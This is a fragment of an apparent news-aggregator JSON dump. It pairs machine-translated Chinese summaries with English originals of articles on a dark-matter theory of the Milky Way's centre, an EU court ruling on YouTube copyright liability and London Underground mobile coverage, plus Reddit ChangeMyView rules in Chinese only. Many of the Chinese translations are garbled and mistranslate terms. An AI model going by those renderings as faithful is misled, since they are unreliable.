*\u4ee3\u66ff\u6591\u70b9\u7684\u8d28\u91cf\uff0c\u8fd9\u5c06\u9700\u8981\u66f4\u591a\u7684\u6750\u6599\uff0c\u4ee5\u4fbf\u53d8\u6210\u4e00\u4e2a\u9ed1\u6d1e\u3002\u76ee\u524d\uff0c\u5b83\u53ef\u4ee5\u6210\u4e3a\u4e00\u4e2a\u5bc6\u96c6\u7684\u6591\u70b9\uff0c\u4ecd\u7136\u5438\u5f15\u9644\u8fd1\u7269\u4f53\u4f5c\u4e3a\u9ed1\u6d1e\u3002\u5982\u679c\u5b83\u662f\u4e00\u79cd\u672a\u6765\u7684\u672a\u6765\u9ed1\u6d1e\uff0c\u53ef\u4ee5\u89e3\u91ca\u4e00\u4e0b\u7b2c\u4e00\u540d\u7684\u8d85\u7ea7\u5206\u914d\u9ed1\u6d1e\u7684\u5f62\u5f0f - \u51e0\u5341\u5e74\u6765\u7684\u79d1\u5b66\u5bb6\u4eec\u5df2\u7ecf\u7591\u60d1\u3002\n \u5728\u8fd9\u9879\u65b0\u7814\u7a76\u4e2d\uff0c\u7531Mnras\u5b57\u6bcd\uff0c\u610f\u5927\u5229\u8bed\uff0c\u963f\u6839\u5ef7\u4eba\u548c\u54e5\u4f26\u6bd4\u4e9a\u79d1\u5b66\u5bb6\u7684\u51fa\u7248\u7269\u63a5\u53d7\uff0c\u4e0d\u4ec5\u4ec5\u662f\u76f4\u63a5\u5f71\u54cd\u7684G2\u548cS2\u7a7a\u95f4\u5bf9\u8c61\u4e0e\u6697\u7269\u8d28\u7406\u8bba\u76f8\u7ed3\u5408\u3002\u4ed6\u4eec\u5df2\u7ecf\u5c06\u4ed6\u4eec\u7684\u7814\u7a76\u6269\u5c55\u5230\u6700\u63a5\u8fd1\u7684\u6700\u826f\u597d\u7684\u661f\u661f\u8f68\u9053\u5c04\u624b\u5ea7A *\uff0c\u53d1\u73b0\u8fd9\u4e9b\u6052\u661f\u4e5f\u4e0e\u6697\u7269\u8d28\u6a21\u578b\u4e00\u81f4\u3002\n \u90a3\u4e48\uff0c\u8fd9\u4e9b\u53d1\u73b0\u610f\u5473\u7740\u4ec0\u4e48\uff1f\u597d\u5427\uff0c\u5f53\u6d89\u53ca\u5230\u94f6\u6cb3\u7cfb\u7684\u5fc3\u4e2d\u7684\u65cb\u8f6c\u7684\u8c1c\u56e2\u65f6\uff0c\u6240\u6709\u65b0\u95fb\u90fd\u662f\u597d\u6d88\u606f\u3002\u8fd9\u4e9b\u79d1\u5b66\u5bb6\u63a8\u51fa\u4e86\u4e00\u4e2a\u96c4\u5fc3\u52c3\u52c3\u7684\u65b0\u7406\u8bba\uff0c\u968f\u540e\u7684\u5de5\u4f5c\u5c06\u5907\u4efd\u6216\u5c0a\u91cd\u4e0d\u540c\u610f\uff0c\u5f15\u7528\u4e0d\u540c\u7684\u5206\u6790\u548c\u89c2\u5bdf\u3002\u8fd9\u5c06\u7ee7\u7eed\u5bfc\u81f4\u66f4\u597d\u5730\u4e86\u89e3\u8d85\u73b0\u5b9e\u7684\u9ed1\u6d1e\u548c\u5c04\u624b\u5ea7A * *\u7279\u522b\u65b9\u6848\uff0c\u53ef\u4ee5\u5e2e\u52a9\u89e3\u51b3\u8c1c\u56e2\u3002 \n\u6b64\u5185\u5bb9\u7531\u7b2c\u4e09\u65b9\u521b\u5efa\u548c\u7ef4\u62a4\uff0c\u5e76\u5bfc\u5165\u672c\u9875\u4ee5\u5e2e\u52a9\u7528\u6237\u63d0\u4f9b\u5176\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002 \u60a8\u53ef\u4ee5\u5728Piano.io\u627e\u5230\u6709\u5173\u6b64\u4ea7\u54c1\u548c\u7c7b\u4f3c\u5185\u5bb9\u7684\u66f4\u591a\u4fe1\u606f ", "note_en": "The center of the Milky Way  could be dark matter instead of a  supermassive black hole, according to a new study.\n The study is based on observations of the objects that orbit closest to the center.\n   What if the center of our galaxy isn\u2019t a  supermassive black hole after all, but instead, a massive amount of  dark matter? That would flip our long-held understanding of the Milky Way, but in a new study, scientists from Italy, Argentina, and Colombia say the evidence stacks up.\n \u27a1  You think space is badass. So do we.  Let\u2019s explore it together.\n The idea of a supermassive black hole at the center of the Milky Way is well-established, based partly on the orbit of   specific stars like S0-2. Scientists study these objects in orbit as a way to extrapolate what they\u2019re actually orbiting around\u2014in this case, \u201ca supermassive black hole 4 million times the mass of the Sun,\u201d  ScienceAlert   explains.\n That supermassive black hole is called  Sagittarius A*. S0-2 and other established stars are pulled every which way in their orbits around Sagittarius A*, into extreme orbits that scientists measure in order to get some idea of what the supermassive black hole is all about. Think about how soap suds behave as water swirls down your drain and what that tells you about what the drain is doing. Even if you couldn\u2019t see the drain directly, the behaviors around it would give you clues.\n  Scientists are still conducting that kind of research, but a new-to-us class of space objects is casting a shadow over the black hole theory. These objects \u201clook like gas but behave like stars,\u201d physicist Andrea Ghez   told  ScienceAlert in 2020. There are six \u201cG\u201d objects of this kind, with orbits ranging from 170 to 1,600 years long.\n Recently, their wonky orbits have led to a new, competing theory to describe the center of the Milky Way.\n In 2014, scientists observed object G2 pass its closest point to Sagittarius A* and become stretched out and distorted\u2014a phenomenon known as  drag. This, scientists from the International Center for Relativistic Astrophysics in Italy say, is a sign that Sagittarius A* might be something other than a supermassive black hole.\n  In 2020, the same research team   published findings that G2 and S2 might be experiencing the same different kind of gravitational pull near Sagittarius A*. They say the way these objects behave is more consistent with a specific kind of  dark matter, In their side-by-side analysis of black hole versus dark matter as the explanation, dark matter was a better statistical fit.\n  Dark matter is matter that we can\u2019t see, but we  can measure it through its effect on gravity and objects around it. Dark matter   makes up 30 percent of the mass of our universe, yet it\u2019s invisible and, so far, not directly observed. But its presence, along with the related idea of dark  energy, makes up a total of 99.5 percent of the mass of the universe around us and provides the missing piece to a ton of questions in physics and cosmology.\n Dark matter can and does turn into black holes, but the scientists posit that Sagittarius A* is instead a blob-like mass that will require a lot more material in order to turn into a black hole. For now, it could just be a dense blob that still attracts nearby objects as a black hole does. And if it  is a kind of proto future black hole, that could explain how supermassive black holes form in the first place\u2014something scientists have been puzzled by for decades.\n In this  new study, accepted for publication by  MNRAS Letters, the Italian, Argentinian, and Colombian scientists explain that not just the directly affected G2 and S2 space objects line up with the dark matter theory. They\u2019ve expanded their study to the closest, most well-understood stars orbiting Sagittarius A* and found those stars  also behave consistently with a dark matter model.\n So, what do these findings mean? Well, when it comes to the swirling mysteries at the heart of the galaxy, all news is good news. These scientists have put out an ambitious new theory, and subsequent work will either back them up or respectfully disagree, citing different analysis and observation. That will continue to lead toward a better understanding of supermassive black holes and of Sagittarius A* in particular, and could help to solve the mystery.\n     This content is created and maintained by a third party, and imported onto this page to help users provide their email addresses. You may be able to find more information about this and similar content at piano.io", "posttime": "2021-06-22 18:19:29", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u4e2d\u5fc3,milky,\u9ed1\u6d1e", "title": "\u6bd5\u7adf\u94f6\u6cb3\u7cfb\u7684\u4e2d\u5fc3\u53ef\u80fd\u4e0d\u662f\u4e00\u4e2a\u9ed1\u6d1e ", "title_en": "The center of the Milky Way might not be a black hole after all", "transed": 1, "url": "https://www.popularmechanics.com/space/deep-space/a36530817/the-center-of-the-milky-way-might-not-be-a-black-hole-after-all/", "via": "", "real_tags": ["\u4e2d\u5fc3", "milky", "\u9ed1\u6d1e"]}, {"category": "", "categoryclass": "", "imagename": "9b2d8bde5eda5c21e183fb8fec3d15b3.jpg", "infoid": 1067398, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5362\u68ee\u5821\uff0c6\u670822\u65e5\uff08\u8def\u900f\u793e\uff09 - \u5468\u4e8c\u7684\u6b27\u6d32\uff06\uff0339; Sound Court\u8868\u793a\uff0c\u8c37\u6b4c\uff06\uff0339; s\uff08googl.o\uff09YouTube\u548c\u5176\u4ed6\u5728\u7ebf\u5e73\u53f0\u5bf9\u7528\u6237\u4e0a\u4f20\u7684\u7248\u6743\u4fb5\u6743\u4f5c\u54c1\u4e0d\u627f\u62c5\u67d0\u4e9b\u4f7f\u9002\u5e94\u3002\n \u6848\u4ef6\u6807\u5fd7\u7740\u6b27\u6d32\u548c1\u4e07\u4ebf\u7f8e\u5143\u521b\u610f\u884c\u4e1a\u548c\u5728\u7ebf\u5e73\u53f0\u4e4b\u95f4\u7684\u957f\u671f\u6218\u6597\u4e2d\u7684\u6700\u65b0\u53d1\u5c55\uff0c\u524d\u8005\u4ece\u540e\u8005\u5bfb\u6c42\u8d54\u507f\u6216\u884c\u52a8\uff0c\u4ee5\u4fbf\u4e0a\u4f20\u7684\u672a\u7ecf\u6388\u6743\u7684\u4f5c\u54c1\u3002\n YouTube\u5728\u7801\u5934\u5728\u5fb7\u56fd\u00b7\u5f7c\u5f97\u68ee\uff08Brank Peterson\uff09\uff0c\u5728\u5fb7\u56fd\u8d77\u8bc9\u4e86\u516c\u53f8\u548c\u8c37\u6b4c\u7684\u7801\u5934\uff0c\u57282008\u5e74\u901a\u8fc7\u7528\u6237\u4e0a\u4f20\u5230YouTube\uff0c\u4ed6\u62e5\u6709\u6743\u5229\u7684\u51e0\u4e2a\u5531\u7247\u3002\n \u5728\u7b2c\u4e8c\u4e2a\u6848\u4f8b\u4e2d\uff0cElsevier\u51fa\u7248\u96c6\u56e2\u5728\u5fb7\u56fd\u7684\u6258\u7ba1\u670d\u52a1Cyando\u8fdb\u884c\u4e86\u6cd5\u5f8b\u8bc9\u8bbc\uff0c\u5728\u5176\u7528\u6237\u4e0a\u4f20\u4e86\u51e0\u4e2aElsevier\u57282013\u5e74\u4e0a\u4f20\u7684\u5e73\u53f0\u4e0a\u672a\u7ecf\u5176\u6279\u51c6\uff0c\u5b83\u4f1a\u5728\u5176\u5e73\u53f0\u4e0a\u4f20\u3002\n \u5fb7\u56fd\u6cd5\u9662\u968f\u540e\u5bfb\u6c42\u6b27\u76df\u53f8\u6cd5\u6cd5\u9662\u7684\u5efa\u8bae\uff0c\u5468\u4e8c\u7edf\u6cbb\u4e24\u79cd\u6848\u4ef6\u3002\n \uff06\uff0334;\u76ee\u524d\u4ee3\u8868\uff0c\u5728\u7ebf\u5e73\u53f0\u7684\u8fd0\u8425\u5546\u539f\u5219\u4e0a\uff0c\u539f\u5219\u4e0a\uff0c\u4ed6\u4eec\u672c\u8eab\u5c31\u901a\u8fc7\u8fd9\u4e9b\u5e73\u53f0\u7684\u7528\u6237\u5728\u7ebf\u53d1\u5e03\u7684\u7248\u6743\u4fdd\u62a4\u5185\u5bb9\u7684\u516c\u4f17\u6c9f\u901a\uff0c\uff06\uff0334;\u6b27\u76df\u53f8\u6cd5\u6cd5\u9662\u8bf4\u3002\n \uff06\uff0334;\u7136\u800c\uff0c\u8fd9\u4e9b\u8fd0\u8425\u5546\u786e\u5b9e\u5728\u8fdd\u53cd\u7248\u6743\u65b9\u9762\u8fdb\u884c\u4e86\u8fd9\u79cd\u6c9f\u901a\uff0c\u4ee5\u4fbf\u4ec5\u4ec5\u4f7f\u5f97\u8fd9\u4e9b\u5e73\u53f0\u63d0\u4f9b\u7ed9\u516c\u4f17\uff0c\uff06\uff0334\u63d0\u4f9b\u6b64\u7c7b\u5185\u5bb9\u3002\u6cd5\u5b98\u8bf4\u3002 ", "note_en": "LUXEMBOURG, June 22 (Reuters) - Europe&#39;s top court on Tuesday said that Google&#39;s  (GOOGL.O) YouTube and other online platforms are not liable for copyright-infringing works uploaded by users onto their platforms under certain conditions.\n The case marks the latest development in a long-running battle between Europe&#39;s $1 trillion creative industry and online platforms, with the former seeking compensation or action from the latter for unauthorised works that are uploaded.\n YouTube found itself in the dock after Frank Peterson, a music producer, sued the company and Google in Germany over the uploading to YouTube by users in 2008 of several phonograms to which he holds the rights.\n In a second case, publishing group Elsevier took legal action against file-hosting service Cyando in Germany after its users uploaded several Elsevier works on its platform Uploaded in 2013 without its approval.\n A German court subsequently sought advice from the EU Court of Justice, which ruled on both cases on Tuesday.\n &#34;As currently stands, operators of online platforms do not, in principle, themselves make a communication to the public of copyright-protected content illegally posted online by users of those platforms,&#34; the EU Court of Justice said.\n &#34;However, those operators do make such a communication in breach of copyright where they contribute, beyond merely making those platforms available, to giving access to such content to the public,&#34; judges said.", "posttime": "2021-06-22 17:32:11", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "youtube,\u4e0a\u4f20,court,\u5fb7\u56fd", "title": "\u6b27\u76df\u53f8\u6cd5\u6cd5\u9662\u79f0YouTube\u548c\u5176\u4ed6\u5e73\u53f0\u5bf9\u67d0\u4e9b\u6761\u4ef6\u4e0b\u7528\u6237\u4e0a\u4f20\u7684\u7248\u6743\u4fb5\u6743\u5185\u5bb9\u4e0d\u627f\u62c5\u8d23\u4efb ", "title_en": "EU Court of Justice says YouTube and other platforms are not liable for copyright-infringing content uploaded by users under certain conditions", "transed": 1, "url": "https://www.reuters.com/technology/eu-top-court-says-youtube-not-liable-user-copyright-breaches-2021-06-22/", "via": "", "real_tags": ["youtube", "\u4e0a\u4f20", "court", "\u5fb7\u56fd"]}, {"category": "", "categoryclass": "", "imagename": "978d9b661f650c4fbfa3928c9f111237.jpg", "infoid": 1067397, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4f26\u6566\u5e02\u957f\u8428\u8fea\u514b\u6c57\u5ba3\u5e03\uff0c\u622a\u81f32024\u5e74\u5e95\uff0c\u4f26\u6566\u5730\u4e0b\u7684\u4e58\u5ba2\u5c06\u5728\u6574\u4e2a\u7ad9\u548c\u96a7\u9053\u7f51\u7edc\u4e0a\u8fdb\u884c\u79fb\u52a8\u63a5\u6536\u3002\u5305\u62ec\u725b\u6d25\u9a6c\u620f\u56e2\uff0c\u6258\u7279\u7eb3\u59c6\u6cd5\u9662\u9053\u8def\uff0c\u94f6\u884c\uff0c\u5c24\u65af\u901a\u548c\u5361\u59c6\u767b\u9547\u7684\u70ed\u95e8\u7ad9\u5c06\u57282022\u5e74\u5e95\u6301\u7eed\u4e0a\u5347\uff0c\u8986\u76d6\u5728\u968f\u540e\u7684\u51e0\u4e2a\u6708\u5185\u5728\u9636\u6bb5\u6269\u5c55\u3002\n \u57282020\u5e743\u6708\uff0c\u5a01\u65af\u654f\u65af\u7279\u548c\u51ef\u5b81\u9547\u7684\u79a7\u5e74\u7684\u4e00\u534a\u6c47\u7387\u4ecb\u7ecd\u4e864G\u8986\u76d6\u8303\u56f4\u540e\uff0c\u5ba3\u5e03\u622a\u81f3\u4e00\u5e74\u4ee5\u6765\u3002\u4f26\u6566\uff08TFL\uff09\u7684\u8fd0\u8f93\uff0c\u8be5\u5e02\u7684\u8fd0\u8f93\u5f53\u5c40\u8868\u793a\u5373\u5c06\u5230\u6765\u7684\u57fa\u7840\u8bbe\u65bd\u5c06\u652f\u63015G\u7f51\u7edc\u4ee5\u53ca4G\uff0c\u4f46\u5b83\u5c06\u6210\u4e3a\u79fb\u52a8\u8fd0\u8425\u5546\u672c\u8eab\uff0c\u4e3a\u4e0b\u4e00\u4ee3\u79fb\u52a8\u7f51\u7edc\u63d0\u4f9b\u652f\u6301\u3002\n  \u201cI promised Londoners that if they re-elected me for a second term as mayor I would deliver 4G throughout the tube network,\u201d London\u2019s mayor Sadiq Khan said in a statement. \u201c\u8fd9\u5df2\u7ecf\u5728Jubilee\u7ebf\u7684\u4e1c\u534a\u90e8\u8dd1\u4e86\u4e0a\u5347\uff0c\u6211\u4eca\u5929\u5f88\u9ad8\u5174\u5730\u5ba3\u5e03\uff0c\u6211\u6b63\u5728\u5c65\u884c\u8fd9\u79cd\u627f\u8bfa\u548c\u5b8c\u5168\u4e92\u8054\u7f51\u63a5\u5165\uff0c\u5c06\u5728\u7ba1\u9053\u4e0a\u63d0\u4f9b\uff0c\u5176\u4e2d\u6709\u725b\u6d25\u9a6c\u620f\u56e2\u548c\u5c24\u65af\u987f\u7b49\u5173\u952e\u7684\u4e2d\u592e\u4f26\u6566\u8f66\u7ad9\u5728\u660e\u5e74\u5e74\u5e95\u4e4b\u524d\u8bbe\u5b9a\u4e3a\u53d7\u76ca\u3002\u201c\n TFL\u6b63\u5728\u4f7f\u7528\u767d\u901a\u4fe1\u6765\u63d0\u4f9b\u5168\u7f51\u7edc\u7684\u8986\u76d6\u8303\u56f4\u3002\u8fd9\u9879\u5de5\u4f5c\u5c06\u6d89\u53ca\u5728\u96a7\u9053\u548c\u7ad9\u5185\u94fa\u8bbe\u8d85\u8fc72,000\u516c\u91cc\uff081242\u82f1\u91cc\uff09\u7684\u5e03\u7ebf\u3002\u9664\u4e86\u5411\u7ba1\u4e58\u5ba2\u63d0\u4f9b\u79fb\u52a8\u8986\u76d6\u4e4b\u5916\uff0c\u8be5\u9879\u76ee\u8fd8\u5e94\u66f4\u666e\u904d\u5730\u5bf9\u57ce\u5e02\u7684\u79fb\u52a8\u8986\u76d6\u6709\u76ca\u3002\u5b89\u88c5\u5728\u4f26\u6566\u5730\u4e0b\u96a7\u9053\u4e2d\u7684\u5149\u7ea4\u5e03\u7ebf\u8fd8\u5c06\u8fde\u63a5\u5230\u5927\u697c\u548c\u5176\u4ed6\u57fa\u7840\u8bbe\u65bd\uff0c\u5982\u8857\u9053\u7167\u660e\u548c\u5df4\u58eb\u7ad9\uff0c\u5141\u8bb8\u5b89\u88c5\u5c0f\u578b\u79fb\u52a8\u53d8\u9001\u5668\u5e76\u589e\u52a0\u8986\u76d6\u8303\u56f4\u3002\n \u8be5\u516c\u544a\u5728\u4f26\u6566\u5730\u4e0b\u7684\u4e58\u5ba2\u56e0\u5927\u6d41\u884c\u800c\u4e0b\u964d\uff0c\u5bf9\u8fd0\u8f93\u5f53\u5c40\u5177\u6709\u5de8\u5927\u7684\u8d22\u52a1\u5f71\u54cd\u3002 6\u6708\u4efd\uff0c\u82f1\u56fd\u653f\u5e9c\u540c\u610f\u63d0\u4f9b\u7b2c\u4e09\u4e2a\u6551\u52a9\uff0c\u4ee5\u4fdd\u6301\u670d\u52a1\u8fd0\u884c\uff0c\u4f7f\u603b\u989d\u8d85\u8fc740\u4ebf\u82f1\u9551\uff08\u7ea656\u4ebf\u7f8e\u5143\uff09\u3002 TFL\u8868\u793a\uff0c\u5728\u7f51\u7edc\u4e0a\u63d0\u4f9b\u79fb\u52a8\u62db\u5f85\u4f1a\u5c06\u572820\u5e74\u4e0eBai\u63d0\u4f9b\u66f4\u591a\u6536\u5165\u3002 ", "note_en": "By the end of 2024, passengers on the London Underground will have mobile reception across the entire network of stations and tunnels, London\u2019s mayor Sadiq Khan  has announced. Popular stations, including Oxford Circus, Tottenham Court Road, Bank, Euston, and Camden Town will be hooked up by the end of 2022, with coverage expanding in phases over the ensuing months.\n The announcement comes just over a year after 4G coverage was introduced on the eastern half of the Jubilee line, between  Westminster and Canning Town, in March 2020. Transport for London (TfL), the city\u2019s transport authority, says the upcoming infrastructure will support 5G networks as well as 4G, but that it will be up to mobile operators themselves to offer support for the next-generation mobile network.\n  \u201cI promised Londoners that if they re-elected me for a second term as mayor I would deliver 4G throughout the tube network,\u201d London\u2019s mayor Sadiq Khan said in a statement. \u201cIt\u2019s already up and running on the eastern half of the Jubilee line and I\u2019m delighted to announce today that I am fulfilling that commitment and full internet access will be available across the tube, with key central London stations such as Oxford Circus and Euston set to benefit before the end of next year.\u201d\n TfL is working with BAI Communications to offer coverage across the network. The work will involve laying over 2,000km (1242 miles) of cabling within tunnels and stations. As well as offering mobile coverage to tube passengers, the project should also have benefits for mobile coverage in the city more generally. The fibre cabling installed in the London Underground\u2019s tunnels will also connect to buildings and other infrastructure like street lighting and bus stops, allowing small mobile transmitters to be installed and increase coverage.\n The announcement comes as ridership on the London Underground has plummeted as a result of the pandemic, with huge financial implications for the transport authority. In June, the UK government  agreed to give TfL a third bailout to keep services running, bringing the total to over \u00a34 billion (around $5.6 billion). TfL says providing mobile reception across the network will bring in more revenue over the 20-year contract term with BAI.", "posttime": "2021-06-22 16:44:55", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u5e02\u957f,popular,\u79fb\u52a8", "title": "\u4f26\u6566\u7684\u5e02\u957f\u8868\u793a\uff0c\u5730\u4e0b\u5c06\u5728\u6574\u4e2a\u7f51\u7edc\u4e0a\u52302024\u5e74\u5e95\u7684\u79fb\u52a8\u62a5\u9053\uff0c\u52302022\u5e74\u5e95\uff0c\u4e00\u4e9b\u6d41\u884c\u7684\u7ad9 ", "title_en": "London's mayor says the Underground will have mobile coverage by the end of 2024 across the entire network, with some popular stations by the end of 2022", "transed": 1, "url": "https://www.theverge.com/2021/6/22/22544890/london-underground-tube-2024-4g-5g-mobile-signal?scrolla=5eb6d68b7fedc32c19ef33b4", "via": "", "real_tags": ["\u5e02\u957f", "popular", "\u79fb\u52a8"]}, {"category": "", "categoryclass": "", "imagename": "080e3b0db1f05ffd1aed9f27aaae1e92.png", "infoid": 1067396, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u52a0\u5165\u7559\u4e0b1,319,727\u540d\u8bfb\u8005\u4e00\u4e2a\u5f20\u8d34\u60a8\u63a5\u53d7\u7684\u610f\u89c1\u53ef\u80fd\u4f1a\u6709\u7f3a\u9677\uff0c\u4ee5\u52aa\u529b\u4e86\u89e3\u89e3\u51b3\u95ee\u9898\u7684\u5176\u4ed6\u89c2\u70b9\u3002 \u8f93\u5165\u4ee4\u4eba\u8c08\u8bdd\u7684\u5fc3\u6001\uff0c\u800c\u4e0d\u662f\u8fa9\u8bba\u3002 \u66f4\u591a\u8be6\u60c5  \u89e3\u91ca\u60a8\u7684\u89c6\u56fe\u540e\u9762\u7684\u63a8\u7406\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u8be5\u89c6\u56fe\u7684\uff08\u9700\u8981500\u591a\u4e2a\u5b57\u7b26\uff09\u3002 \u25be  \u6ce8\u610f\uff1a\u5982\u679c\u60a8\u7684\u89c6\u56fe\u662f\u5173\u4e8eA\uff06\uff0334;\u53cc\u6807\u51c6\u548c\uff0334;\uff0c\u8bf7\u53c2\u9605\u6b64\u5904\u7684\u6307\u5bfc\u65b9\u9488\u3002 [ \u66f4\u591a\u7684]  \u60a8\u5fc5\u987b\u4eb2\u81ea\u6301\u6709\u89c6\u56fe\u5e76\u8bc1\u660e\u60a8\u5bf9\u5176\u53d8\u5316\u5f00\u653e.\u25be  \u4e0d\u80fd\u4ee3\u8868\u4ed6\u4eba\u5236\u4f5c\u7684\u804c\u4f4d\uff0c\u7528\u4e8e\u73a9\u9b54\u9b3c\u548c\uff0339; S\u5021\u5bfc\u8005\uff0c\u4f5c\u4e3a\u81ea\u5df1\u4ee5\u5916\u7684\u4efb\u4f55\u5b9e\u4f53\uff0c\u6216\u8005\uff06\uff0334; SOAPBOX\uff06\uff0334; \u901a\u8fc7\u91cd\u65b0\u5236\u4f5c\u8d26\u6237\u7684\u5e16\u5b50\u5fc5\u987b\u901a\u8fc7Modmail\u6279\u51c6\u3002 [ \u66f4\u591a\u7684]  \u63d0\u4ea4\u6807\u9898\u5fc5\u987b\u5145\u5206\u603b\u7ed3\u60a8\u7684\u89c6\u56fe\u5e76\u5305\u542b\uff06\uff0334; CMV\uff1a\uff06\uff0334; \u5728\u5f00\u59cb\u3002 \u25be  \u5e16\u5b50\u65e0\u6cd5\u8868\u8fbe\u4e2d\u7acb\u7acb\u573a\uff0c\u5efa\u8bae\u5bf9\u7279\u5b9a\u4eba\u5458\u9020\u6210\u4f24\u5bb3\uff0c\u81ea\u6211\u4fc3\u9500\uff0c\u6216\u8ba8\u8bba\u8fd9\u79cd\u6f5c\u6c34\u5458\uff08\u8bbf\u95eeR / IDEESFORCMV\uff09\u3002 \u25be \n\u6839\u636e\u4eba\u6c14\u6216\u611f\u77e5\u7684\u653b\u51fb\u6027\uff0c\u6ca1\u6709\u4eceCMV\u7981\u6b62\u89c6\u91ce\uff0c\u4f46\u51fa\u4e8e\u5b9e\u9645\u539f\u56e0\uff0c\u4e0d\u5141\u8bb8\u4e0a\u8ff0\u7c7b\u578b\u7684\u5e16\u5b50\u3002 [ \u66f4\u591a\u7684]  \u53ea\u6709\u5e16\u5b50\uff0c\u5982\u679c\u60a8\u613f\u610f\u4e0e\u90a3\u4e9b\u56de\u590d\u60a8\u7684\u4eba\u8fdb\u884c\u5bf9\u8bdd\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u53d1\u5e033\u5c0f\u65f6\u5185\u5f00\u59cb\u8fd9\u6837\u505a\u3002 \u25be  \u5bf9CMV\u804c\u4f4d\u7684\u76f4\u63a5\u54cd\u5e94\u5fc5\u987b\u6311\u6218OP\u7684\u8bf4\u660e\u89c6\u56fe\uff08\u4f46\u662f\u672a\u6210\u5e74\u4eba\uff09\u7684\u81f3\u5c11\u4e00\u4e2a\u65b9\u9762\uff0c\u6216\u8005\u63d0\u51fa\u6f84\u6e05\u95ee\u9898\u3002 \u25be  \u6709\u5229\u4e8e\u89c6\u56feOP\u7684\u8bba\u636e\u613f\u610f\u6539\u53d8\u5fc5\u987b\u4ec5\u9650\u4e8e\u5bf9\u5176\u4ed6\u8bc4\u8bba\u7b54\u590d\u3002 [ \u66f4\u591a\u7684]  \u5373\u4f7f\u5b83\u7684\u5176\u4f59\u90e8\u5206\u662f\u575a\u5b9e\u7684\uff0c\u60a8\u7684\u8bc4\u8bba\u4e5f\u4f1a\u88ab\u5220\u9664\u3002 \uff06\uff0339;\u4ed6\u4eec\u5f00\u59cb\u5b83\uff06\uff0339; \u4e0d\u662f\u501f\u53e3\u3002 \u60a8\u5e94\u8be5\u62a5\u544a\uff0c\u800c\u4e0d\u662f\u62a5\u590d\u3002 [ \u66f4\u591a\u7684]  \u907f\u514d\u6307\u8d23OP\u6216\u5176\u4ed6\u4efb\u4f55\u4eba\u4e0d\u613f\u610f\u6539\u53d8\u4ed6\u4eec\u7684\u89c2\u70b9\uff0c\u6216\u8005\u4ee5\u6076\u610f\u4e89\u5435\u3002 \u25be  \u5982\u679c\u60a8\u4e0d\u786e\u5b9a\u67d0\u4eba\u662f\u5426\u662f\u771f\u5b9e\u7684\uff0c\u8bf7\u8be2\u95ee\u6f84\u6e05\u95ee\u9898\uff08\u89c1\uff1aSocratic\u65b9\u6cd5\uff09\u3002 \u5982\u679c\u60a8\u8ba4\u4e3a\u4ed6\u4eec\u4ecd\u7136\u8868\u73b0\u51fa\u53ef\u601c\u7684\u884c\u4e3a\uff0c\u8bf7\u81f4\u7535\u6211\u4eec\u3002 [ \u66f4\u591a\u7684] \n\u5982\u679c\u60a8\u9881\u53d1\u4e86\u4e00\u4e2a\u4e09\u89d2\u6d32\uff0c\u8bf7\u9881\u53d1\uff06\uff0339; ve\u627f\u8ba4\u60a8\u7684\u89c2\u70b9\u7684\u53d8\u5316\u3002\u4e0d\u8981\u4e3a\u4efb\u4f55\u5176\u4ed6\u76ee\u7684\u4f7f\u7528Deltas\u3002 \u25be\n \u60a8\u5fc5\u987b\u5305\u542b\u4e0eDelta\u66f4\u6539\u7684\u89e3\u91ca\uff0c\u6240\u4ee5\u6211\u4eec\u77e5\u9053\u5b83\uff06\uff0339; s\u771f\u6b63\u7684\u3002\u4e09\u89d2\u6d32\u8650\u5f85\u5305\u62ec\u8bbd\u523a\u7684Deltas\uff0c\u7b11\u8bdd\u0394\uff0c\u8d85\u7ea7\u5347\u7a7a\u0394\u7b49[\u66f4\u591a]\n \u53ea\u6709\u94fe\u63a5\uff0c\u7b11\u8bdd\uff0c\u6216\uff06\uff0334\u7684\u8bc4\u8bba;\u4e66\u9762\u4e0a\u5347\uff06\uff0334;\u5c06\u88ab\u5220\u9664\u3002\u5e7d\u9ed8\u548c\u5bf9\u534f\u8bae\u7684\u80af\u5b9a\u53ef\u4ee5\u5305\u542b\u5728\u66f4\u5b9e\u8d28\u6027\u7684\u8bc4\u8bba\u4e2d\u3002 [ \u66f4\u591a\u7684]\n  \u65e0\u8bba\u4f60\uff06\uff0339;\u518d\u5728OP\u4e0e\u5426\uff0c\u8bf7\u56de\u590d\u5230\u60a8\u7684\u8bc4\u8bba\u4e0e\u589e\u91cf\u66f4\u6539\u60a8\u7684\u89c6\u56fe\u5728\u4efb\u4f55\u7a0b\u5ea6\uff08\u4e0b\u6587\u8bf4\u660e\uff09\u7684\u7528\u6237\uff08\u4e00\u4e2a\u6216\u591a\u4e2a\uff09\uff0c\u5e76\u4e14\u8fd8\u5305\u62ec\u53d8\u5316\u7684\u89e3\u91ca\u3002\u5b8c\u6574\u7684\u7ec6\u8282\u3002\n   / U / Deltabot\u5c06\u7ef4\u62a4\u7528\u6237Flair\u4e2d\u7684Delta\u8ba1\u6570\uff0c\u4e3a\u6bcf\u4e2a\u7528\u6237\u7684Wiki\u9875\u9762\uff06\uff0339; s delta\u5386\u53f2\u8bb0\u5f55\uff0c\u8bb0\u5f55deltas in / r / deltalog\uff0c\u4ee5\u53ca\u5728\u5fc5\u8981\u65f6\u66f4\u65b0deltaboards\u3002\n       \u5728\u661f\u671f\u4e94\uff0c\u5e16\u5b50\u53ef\u4ee5\uff06\uff0339; t\u4e0e\u8fc7\u53bb\u4e00\u4e2a\u6708\u7684\u4efb\u4f55\u5176\u4ed6\u4eba\u90fd\u975e\u5e38\u76f8\u4f3c\uff0c\u5e76\u5728\u65b0\u961f\u5217\u4e2d\u8d62\u5f97\u4e86\uff06\uff0339;\u5728\u65b0\u7684\u961f\u5217\u4e2d\u51fa\u73b0\uff0c\u76f4\u5230\u4ed6\u4eec\u88ab\u4e3b\u6301\u4eba\u68c0\u67e5\u5e76\u6279\u51c6\u4e86\u3002 